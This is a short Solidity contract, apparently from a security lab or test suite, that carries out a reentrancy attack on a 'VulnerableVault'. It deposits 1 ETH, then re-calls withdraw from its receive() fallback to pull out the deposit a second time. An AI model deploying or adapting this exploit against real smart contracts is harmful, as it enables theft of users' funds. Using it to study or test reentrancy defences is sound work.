
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Reenterer {
    IVulnerableVault public vault;
    uint256 public attackAmount;
    uint256 public reentryCount;

    constructor(address vaultAddress) {
        vault = IVulnerableVault(vaultAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send 1 ETH");

        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(attackAmount);
    }

    receive() external payable {
        if (
            reentryCount == 0 &&
            address(vault).balance >= attackAmount
        ) {
            reentryCount = 1;
            vault.withdraw(attackAmount);
        }
    }
}
